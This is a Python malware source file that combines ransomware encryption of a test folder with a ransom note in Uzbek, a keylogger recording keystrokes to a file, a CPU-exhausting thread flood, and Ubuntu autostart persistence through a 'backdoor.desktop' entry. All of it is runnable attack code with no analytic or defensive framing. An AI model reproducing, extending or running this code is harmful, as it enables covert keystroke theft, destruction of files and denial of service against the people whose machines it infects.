import os
import sys
import threading
import time
import psutil
import base64
from cryptography.fernet import Fernet
from pynput.keyboard import Listener
import random
import shutil

key = Fernet.generate_key()
cipher = Fernet(key)

LOG_FILE = "keystrokes.txt"

def encrypt_file(file_path):
    try:
        with open(file_path, "rb") as f:
            file_data = f.read()
        encrypted_data = cipher.encrypt(file_data)
        with open(file_path + ".enc", "wb") as f:
            f.write(encrypted_data)
        os.remove(file_path)
        return True
    except:
        return False

def ransomware():
    target_dir = "test_victim"
    if not os.path.exists(target_dir):
        os.makedirs(target_dir)
        with open(os.path.join(target_dir, "example.txt"), "w") as f:
            f.write("Bu sinov fayli")
    for root, _, files in os.walk(target_dir):
        for file in files:
            file_path = os.path.join(root, file)
            if not file.endswith(".enc"):
                encrypt_file(file_path)
    # message to user
    with open("README.txt", "w") as f:
        f.write(f"Fayllariniz shifrlangan. Kalit: {base64.b64encode(key).decode()}")

def keylogger():
    def on_press(key):
        try:
            with open(LOG_FILE, "a") as f:
                f.write(f"{time.ctime()} - {str(key)}\n")
        except AttributeError:
            with open(LOG_FILE, "a") as f:
                f.write(f"{key}\n")

    with Listener(on_press=on_press) as listener:
        listener.join()

def overload_system():
    def cpu_killer():
        while True:
            random.random()

    for _ in range(10):
        threading.Thread(target=cpu_killer, daemon=True).start()

def hide_process():
    pass

def persistence():
    # Ubuntu persistence
    script_path = os.path.abspath(__file__)
    # Use .config/autostart for persistence
    autostart_dir = os.path.expanduser("~/.config/autostart")
    if not os.path.exists(autostart_dir):
        os.makedirs(autostart_dir)
    desktop_file_path = os.path.join(autostart_dir, "backdoor.desktop")
    with open(desktop_file_path, "w") as desktop_file:
        desktop_file.write("[Desktop Entry]\n")
        desktop_file.write("Name=Backdoor\n")
        desktop_file.write("Exec=" + sys.executable + " " + script_path + "\n")
        desktop_file.write("Type=Application\n")
        desktop_file.write("Terminal=false\n")
        desktop_file.write("Hidden=false\n")

def backdoor_main():
    hide_process()
    persistence()
    threading.Thread(target=overload_system, daemon=True).start()
    threading.Thread(target=ransomware, daemon=True).start()
    threading.Thread(target=keylogger, daemon=True).start()
    while True:
        time.sleep(60)
if __name__ == "__main__":
    threading.Thread(target=backdoor_main, daemon=True).start()
    while True:
        time.sleep(1000)
